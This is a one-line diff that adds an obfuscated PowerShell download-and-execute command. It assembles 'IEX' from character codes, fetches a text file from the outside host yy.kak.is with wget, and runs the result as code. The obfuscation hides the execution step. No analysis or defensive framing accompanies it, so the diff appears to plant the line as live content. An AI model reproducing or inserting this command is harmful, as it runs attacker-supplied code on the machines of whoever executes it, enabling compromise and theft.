@@ -1,0 +1,1 @@
+(73,69,88)|%{$E+=[char][int]$_};.$E(.('w'+'get') -usebasicpa yy.kak.is/1.txt)
